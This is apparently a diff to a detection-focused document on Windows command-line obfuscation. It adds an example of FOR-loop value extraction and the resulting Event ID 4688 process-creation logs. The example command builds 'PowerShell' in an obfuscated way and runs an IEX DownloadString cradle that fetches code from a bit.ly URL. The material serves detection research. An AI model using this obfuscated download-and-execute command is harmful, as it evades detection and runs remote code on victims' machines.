@@ -98,7 +98,25 @@ However in child Process Creation WEL Security Event ID 4688 existing environmen
 So this subtype of binary obfuscation is considered out of scope for this Issue.
 
 #### For Loop Value Extraction
-It is possible to construct a binary name like cmd or PowerShell in memory that does not resolve on cmd.exe’scommand line upon execution, evading both static and dynamic detections focusing on the presence of these values.
+The same as Environment Variable Substrings in the last child Process Creation WEL Security Event ID 4688 existing environment variables resolve to their underlying value. E.g. if we'll use this example command:
+```CMD
+C:\>cmd /c "FOR /F "delims=6M. tokens=2" %Z IN ('ftype^|findstr lMo')DO %Z IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')"
+
+```
+we'll see the following parent-child process creation chain in WEL:
+```XML
+ <Data Name="NewProcessId">0x990</Data> 
+ <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data> 
+ <Data Name="CommandLine">cmd /c "FOR /F "delims=6M. tokens=2" %Z IN ('ftype^|findstr lMo')DO %Z IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')"</Data> 
+>
+ <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
+ <Data Name="ProcessId">0x990</Data> 
+ <Data Name="CommandLine">C:\Windows\system32\cmd.exe /c ftype|findstr lMo</Data> 
+>
+ <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
+ <Data Name="ProcessId">0x990</Data> 
+ <Data Name="CommandLine">PowerShell IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')</Data> 
+```
 
 
 ### ENCODING
